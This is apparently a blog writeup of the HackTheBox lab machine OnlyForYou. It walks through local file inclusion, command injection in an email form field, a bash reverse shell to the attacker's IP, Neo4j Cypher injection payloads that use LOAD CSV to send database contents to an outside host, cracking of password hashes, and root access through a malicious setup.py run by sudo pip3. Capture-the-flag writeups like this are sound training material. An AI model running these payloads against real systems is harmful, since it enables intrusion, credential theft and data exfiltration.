---
layout: post
title:  "Writeup of OnlyForYou (HackTheBox)"
date:   2023-11-18 18:06:00 +0000
categories: hackthebox
author: brun0ne
tags: htb hackthebox onlyforyou LFI neo4j
---

# Discovery

10.10.11.210:80 -> http://only4you.htb/

`ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H 'Host: FUZZ.only4you.htb' -u http://only4you.htb -o subdomains.scan -fs 178`

```
beta.only4you.htb
```

We got **source.zip** containing the source code.

# LFI

Source code of `/download` endpoint:

```python
f '..' in filename or filename.startswith('../'):
        flash('Hacking detected!', 'danger')
        return redirect('/list')
    if not os.path.isabs(filename):
        filename = os.path.join(app.config['LIST_FOLDER'], filename)
```

`os.path.join()` will ignore everything else if `filename` begins with `/`.

PoC:

```python
>>> os.path.join("/some/path/to/file", "/test")
'/test'
```

It would probably be vulnerable either way because of the `not os.path.isabs()` check. 

So, there's an LFI on `POST /download`.

- **/etc/passwd**

```
root:x:0:0:root:/root:/bin/bash
john:x:1000:1000:john:/home/john:/bin/bash
neo4j:x:997:997::/var/lib/neo4j:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
...
```

From **/var/log/nginx/error.log** we get this path:

```
unix:/var/www/only4you.htb/only4you.sock
```

Which tells us where the app is located: `/var/www/only4you.htb/`.
There is also `/var/www/beta.only4you.htb/`.

`/var/www/only4you.htb/` contains the source to the main site, which we haven't had before.

**tool.py:**

```python
from form import sendmessage

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        ...
        status = sendmessage(email, subject, message, ip)
```

**form.py:**

```python
domain = email.split("@", 1)[1]
result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
```

This looks like an **RCE** in **email** POST param.

**Confirmed by ping!** (The request below should be URL-encoded)

```
name=a&email=a@a.com; ping+10.10.14.80&subject=a&message=a
```

`sudo tcpdump -i tun0 icmp -n`

```
14:12:30.956018 IP 10.10.11.210 > 10.10.14.80: ICMP echo request, id 2, seq 1, length 64
14:12:30.956031 IP 10.10.14.80 > 10.10.11.210: ICMP echo reply, id 2, seq 1, length 64
```

# Reverse shell as www-data

(URL-encoded):

```
name=a&email=a@a.com; bash -c 'bash -i >& /dev/tcp/10.10.14.80/9002 0>&1'&subject=a&message=a
```

`id`

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

`find / -user dev 2>/dev/null`

```
/opt/internal_app
/opt/gogs
/home/dev
```

```
drwxr-----  6 dev  dev  4096 Jun 30 12:20 gogs
drwxr-----  6 dev  dev  4096 Mar 30 11:51 internal_app
```

`netstat -tulpn`

```
tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1032/nginx: worker  
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -                   
tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
```

:3000 appears to be gogs,
:8001 some login page

`./chisel server -p 1337 --reverse`

`./chisel client 10.10.14.80:1337 R:3000:127.0.0.1:3000/tcp`

`./chisel client 10.10.14.80:1337 R:8001:127.0.0.1:8001/tcp`

# Port 3000 - Gogs

:3000 is hosting **Gogs**. There is a login page.
Nothing interesting found in Explore.

# Port 8001 - "internal app"

It's some login page, different site than anything before. Probably `/opt/internal_app/`.

**admin:admin** works!

There's a search functionality in `/employees`.

Let's test `POST /search`.

- `search=a'` throws a 500 error.

- `search=a' %2b (2*2) %2b 'a` is fine (200). 

So there's some kind of injection. The website runs **gunicorn/20.0.4**.

- `search=a' %2b (2*2) /* x */ %2b 'a` also works, so /* */ make a comment.

- `search=' or '1'='1` returns every employee.

**SQLMap** couldn't identify this backend.

There's /etc/neo4j on the box. **This long payload (URL-encoded):**

```
' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.14.80:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 //
```

...makes a callback!

```
GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400
```

So it's **[Neo4j cypher injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j)**!

# Neo4j

Listing all labels:

```
' OR 1=1 WITH 1 as a  CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.80:8000/?label=' + label as l RETURN 0 as _0 //
```

Dumping users' data:

```
search=' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.14.80:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
```

```
Usernames: admin, john

Hashes:
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
```

(SHA256)

**Cracked:**

```
8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918:admin
a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6:ThisIs4You
```

So we get new creds: **john:ThisIs4You**

# SSH - john

**john:ThisIs4You** works for SSH.

`user.txt: <redacted>`

`sudo -l`

```
Matching Defaults entries for john on only4you:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on only4you:
    (root) NOPASSWD: /usr/bin/pip3 download http\://127.0.0.1\:3000/*.tar.gz
```

# Escalating to root

We can log into **Gogs** on :3000 using **john:ThisIs4You**.

First let's prepare a malicious .tar.gz for pip3.

- put a Python reverse shell into **setup.py**
- move **setup.py** to **arbitrary-directory/**
- `tar -czvf mal.tar.gz arbitrary-directory/`
- upload the file to the **Test** repo on **Gogs**
- change the repo's status to public in settings

Then run:

`sudo /usr/bin/pip3 download http://127.0.0.1:3000/john/Test/raw/master/mal.tar.gz`

And a reverse shell comes back.

`root.txt: <redacted>`
